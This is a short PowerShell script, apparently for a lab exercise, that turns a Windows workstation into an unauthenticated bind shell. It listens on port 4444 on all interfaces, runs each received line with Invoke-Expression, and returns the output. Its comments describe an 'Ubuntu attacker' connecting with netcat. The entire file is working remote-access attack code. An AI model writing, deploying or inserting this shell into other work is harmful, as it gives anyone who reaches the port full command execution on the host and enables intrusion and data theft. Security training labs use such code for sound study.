# Run on the Windows workstation.
# This opens a listening port on Windows. 
# The Ubuntu attacker will connect to it using: nc -nv <Windows_IP> 4444

$BindIP   = "0.0.0.0" # 0.0.0.0 means listen on all available network interfaces
$Port     = 4444

try {
    # 1. Create the listener
    $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($BindIP), $Port)
    $listener.Start()
    Write-Host "[*] Listening on $BindIP`:$Port ..."

    # 2. Wait for the attacker to connect (This blocks until a connection is made)
    $client = $listener.AcceptTcpClient()
    Write-Host "[*] Connection established from $($client.Client.RemoteEndPoint)"

    # 3. Setup the streams
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader -ArgumentList $stream
    $writer = New-Object System.IO.StreamWriter -ArgumentList $stream
    $writer.AutoFlush = $true

    # Send initial prompt
    $writer.WriteLine("PS> ")

    # 4. Command loop
    while ($client.Connected) {
        try {
            # Read command from attacker
            $cmd = $reader.ReadLine()
            
            if ($null -eq $cmd -or $cmd -eq "exit") { break }

            # Execute command
            try   { $output = Invoke-Expression $cmd 2>&1 | Out-String }
            catch { $output = "ERROR: $_" }

            # Send output back
            $writer.WriteLine($output)
            $writer.WriteLine("PS> ")
        }
        catch {
            # If the connection drops, break the loop
            break
        }
    }
}
catch {
    Write-Host "Error: $_"
}
finally {
    # 5. Cleanup
    if ($client) { $client.Close() }
    if ($listener) { $listener.Stop() }
    Write-Host "[*] Listener stopped."
}
